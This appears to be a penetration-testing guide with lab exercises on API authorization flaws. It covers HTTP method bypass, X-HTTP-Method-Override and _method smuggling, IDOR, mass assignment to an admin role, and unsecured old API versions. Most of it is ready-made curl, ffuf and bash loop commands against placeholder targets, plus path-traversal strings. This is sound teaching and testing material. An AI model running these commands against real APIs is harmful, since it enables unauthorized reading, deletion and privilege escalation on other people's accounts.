API Access Control Testing

HTTP method restrictions · Endpoint data modification · Bypass techniques · Lab exercises

What we're testing
API access control vulnerabilities arise when servers enforce authorization only on some HTTP methods, or trust method-override headers, allowing an attacker to read/write data they shouldn't have access to.

Three core attack classes:

High Impact
Method-based auth bypass
Auth checked on POST but not PUT/PATCH/DELETE — same endpoint, different method, no enforcement.
Medium Impact
HTTP method override
Smuggle DELETE inside a GET via X-HTTP-Method-Override, _method param, or X-Method-Override.
Medium Impact
IDOR via param tampering
Object ID in URL/body not bound to authenticated user — change it to access another user's data.
Recon
Undocumented endpoints
Hidden admin/debug/v0 endpoints visible in JS files, swagger specs, or route fuzzing.
Attack flow summary
Enumerate endpoints
→
Map allowed methods
→
Try forbidden methods
→
Override headers
→
Tamper params / IDOR
Step 1 — Endpoint discovery
Sources to mine before touching the API:

  • JS bundles — grep for /api/, /v1/, /admin/, fetch() and axios() calls
  • Swagger / OpenAPI spec — check /api-docs, /swagger.json, /openapi.yaml
  • Postman collections — sometimes exposed at /postman_collection.json
  • robots.txt, sitemap.xml, .git/
  • Wayback Machine / CommonCrawl for old API paths
  • Mobile app APK/IPA decompilation (jadx, apktool, frida)

Fuzz endpoints with wordlists
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -u https://target.com/api/v1/FUZZ -mc 200,201,204,401,403 -H "Authorization: Bearer <token>" # Try version enumeration ffuf -w versions.txt -u https://target.com/api/FUZZ/users # versions.txt: v1 v2 v3 v0 beta dev admin internal
Step 2 — Map methods per endpoint
Use OPTIONS to discover what the server claims it supports, then test each one regardless.

# OPTIONS request to discover allowed methods curl -X OPTIONS https://target.com/api/v1/users/123 -i # Look for: Allow: GET, POST ← missing PUT/DELETE is interesting # Test every method manually regardless for method in GET POST PUT PATCH DELETE HEAD TRACE OPTIONS CONNECT; do echo "=== $method ===" curl -X $method https://target.com/api/v1/users/123 \ -H "Authorization: Bearer <lowpriv_token>" -si | head -5 done

Interesting response codes to watch
200 OK — works, check response body 204 No Content — action ran silently 405 Method Not Allowed — but try override headers! 403 Forbidden — auth hit, but maybe bypassable 401 Unauth — unauthenticated path found
HTTP method override techniques
Some frameworks (Rails, Laravel, old REST proxies) allow the HTTP verb to be overridden via headers or body params. The firewall/WAF sees GET or POST, but the app processes it as DELETE or PUT.
Technique 1 — X-HTTP-Method-Override header
# Try forbidden method via override header curl -X POST https://target.com/api/v1/users/42 \ -H "X-HTTP-Method-Override: DELETE" \ -H "Authorization: Bearer <token>" -si # Also try these header variants: -H "X-Method-Override: DELETE" -H "X-HTTP-Method: DELETE" -H "_method: DELETE" # older PHP/Rails
Technique 2 — _method query/body parameter
# Via query string curl -X POST "https://target.com/api/v1/users/42?_method=DELETE" \ -H "Authorization: Bearer <token>" -si # Via form body curl -X POST https://target.com/api/v1/users/42 \ -d "_method=DELETE&name=attacker" \ -H "Authorization: Bearer <token>" -si # Via JSON body curl -X POST https://target.com/api/v1/users/42 \ -H "Content-Type: application/json" \ -d '{"_method":"DELETE"}' \ -H "Authorization: Bearer <token>" -si
Technique 3 — Direct method use against unprotected verb
Sometimes only GET is protected by auth. PUT, PATCH, DELETE on the same endpoint may be missing middleware.

# Normal user — PUT to update another user's data curl -X PUT https://target.com/api/v1/users/1 \ -H "Authorization: Bearer <normal_user_token>" \ -H "Content-Type: application/json" \ -d '{"role":"admin","email":"attacker@evil.com"}' # Expected: 403 Forbidden # Vulnerable: 200 OK / 204 No Content
Technique 4 — IDOR through method + ID tampering
Combine method access with direct object reference — read/modify other users' objects.

# Your account: /api/v1/orders/9001 — try other IDs for id in {9000..9010}; do echo "--- ID: $id ---" curl -s -X GET https://target.com/api/v1/orders/$id \ -H "Authorization: Bearer <your_token>" | python3 -m json.tool done # Then try modifying another user's order: curl -X PATCH https://target.com/api/v1/orders/9005 \ -H "Authorization: Bearer <your_token>" \ -d '{"status":"cancelled","discount":100}'
Detecting whether bypass is possible
Work through these signals to determine exploitability before investing deeper effort.
Likely vulnerable
  • OPTIONS response lists extra methods beyond what docs/UI suggest
  • Different HTTP methods return different status codes (GET→403, PUT→200)
  • X-HTTP-Method-Override header changes the response body or status
  • Response body differs between DELETE /res/1 and POST /res/1?_method=DELETE
  • No Allow header returned at all — server ignores method entirely
  • Server returns 405 on direct call but 200 via override
  • Different auth middleware per route file (common in Express, Flask blueprints)
Not vulnerable / defend in depth
  • All non-GET methods return 405 AND override headers produce same 405
  • CORS preflight strictly enforced — cross-origin methods blocked at proxy layer
  • Auth middleware is framework-global, not per-route (e.g., Express app.use(auth))
  • Request body / query params containing _method are stripped before routing
  • WAF / API gateway enforces method allowlist before request hits app
Ambiguous — investigate further
  • 403 on method: auth enforcement present, but check override headers
  • 200 with empty body: may have run silently — verify side-effects out-of-band
  • Consistent status codes but response times differ: possible server-side processing
  • Framework uses method overriding middleware that you can't confirm is present
Timing & side-effect verification
A 204 No Content tells you nothing about what happened. Verify effects:

  1. Before attack: record baseline state (GET the target resource, note field values)
  2. Execute the method under test (PUT/DELETE/PATCH)
  3. GET the resource again — did it change? Was it deleted?
  4. If deleting: try fetching — 404 confirms deletion
  5. If updating: check the modified field values in the response
  6. Check audit trail / logs if accessible (admin panel, debug endpoints)
Lab 1 — Broken function-level authorization
Setup App has GET /api/v1/users (admin only) and POST /api/v1/users (admin only). You have a normal user JWT.

Test
# 1. Confirm GET is blocked curl -s -X GET https://lab/api/v1/users \ -H "Authorization: Bearer <user_jwt>" # Response: 403 {"error":"Forbidden"} # 2. Try DELETE on a specific user curl -s -X DELETE https://lab/api/v1/users/5 \ -H "Authorization: Bearer <user_jwt>" # Vulnerable response: 204 No Content ← DELETE not protected! # 3. Confirm deletion curl -s -X GET https://lab/api/v1/users/5 \ -H "Authorization: Bearer <admin_jwt>" # Response: 404 — user deleted by low-priv account
Lab 2 — Method override via header
Setup DELETE /api/v1/posts/7 returns 403. Test override headers.

# Direct DELETE — blocked curl -X DELETE https://lab/api/v1/posts/7 -H "Authorization: Bearer <token>" # 403 Forbidden # Try POST with X-HTTP-Method-Override curl -X POST https://lab/api/v1/posts/7 \ -H "X-HTTP-Method-Override: DELETE" \ -H "Authorization: Bearer <token>" # Vulnerable: 200 {"deleted":true} # Automation — try all override vectors for hdr in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do echo "Testing header: $hdr" curl -s -X POST https://lab/api/v1/posts/7 \ -H "$hdr: DELETE" \ -H "Authorization: Bearer <token>" | head -c 100 echo done
Lab 3 — Mass assignment via unprotected PATCH
Setup User profile update. POST checks ownership, but PATCH has no auth check. Bonus: server accepts extra fields (mass assignment).

# Normal update path curl -X POST https://lab/api/v1/profile \ -H "Authorization: Bearer <user_token>" \ -d '{"username":"alice"}' # 200 — updates only username # Try PATCH with extra fields (mass assignment) curl -X PATCH https://lab/api/v1/profile \ -H "Authorization: Bearer <user_token>" \ -H "Content-Type: application/json" \ -d '{"username":"alice","role":"admin","verified":true,"credits":99999}' # Vulnerable: 200 {"role":"admin","verified":true,...} ← escalation! # Detect mass assignment by probing field names from JS source/OpenAPI spec # Look for: role, admin, isAdmin, verified, credits, balance, permissions
Lab 4 — IDOR with JWT sub claim
Setup JWT contains sub: 42. API endpoint accepts user ID in URL. Server doesn't validate URL ID matches JWT sub.

# Decode JWT (no verification needed) echo "<base64_payload>" | base64 -d | python3 -m json.tool # {"sub": "42", "role": "user", ...} # Access your own data curl -X GET https://lab/api/v1/users/42/documents \ -H "Authorization: Bearer <your_jwt>" # 200 OK — your docs # Try another user's documents curl -X GET https://lab/api/v1/users/1/documents \ -H "Authorization: Bearer <your_jwt>" # Vulnerable: 200 OK with another user's documents # Also try: /api/v1/users/1/documents — PATCH/DELETE on their docs
Lab 5 — Unauthenticated access via old API version
Setup /api/v2/admin/users requires auth. /api/v1/admin/users is an old version that was never properly secured.

# v2 — properly secured curl -X GET https://lab/api/v2/admin/users # 401 Unauthorized # v1 — auth never applied curl -X GET https://lab/api/v1/admin/users # 200 OK — full user list, plaintext passwords, tokens, etc. # Version bruteforce for ver in v0 v1 v2 v3 v1.1 v2.0 beta dev internal legacy; do code=$(curl -s -o /dev/null -w "%{http_code}" \ https://lab/api/$ver/admin/users) echo "$ver: $code" done
Testing checklist — run through every endpoint

Recon
  • Found Swagger/OpenAPI spec or JS route definitions
  • Identified all API versions (v1, v2, beta, dev…)
  • Fuzzed paths with api-focused wordlists
  • Checked robots.txt, .well-known, /debug, /status, /health
Method testing
  • Sent OPTIONS to every interesting endpoint, noted Allow header
  • Tested every HTTP method manually (GET/POST/PUT/PATCH/DELETE/HEAD)
  • Tried X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method headers
  • Tried _method in query string and request body
  • Verified side effects — GETted resource after supposed modification
Authorization
  • Repeated all requests without any Authorization header
  • Replaced IDs in URLs/body with other users' IDs (IDOR)
  • Tested horizontal privilege escalation (user A accessing user B)
  • Tested vertical privilege escalation (user accessing admin endpoints)
  • Tried mass assignment — added undocumented fields (role, admin, credits)
Headers & encoding tricks
  • Tried Content-Type: text/xml when server expects JSON (parser confusion)
  • Sent HEAD request to check if endpoint exists without triggering full auth
  • Tried path traversal in object IDs: ../admin, %2e%2e%2fadmin
  • Tested with Accept: application/json vs text/html (different handlers)
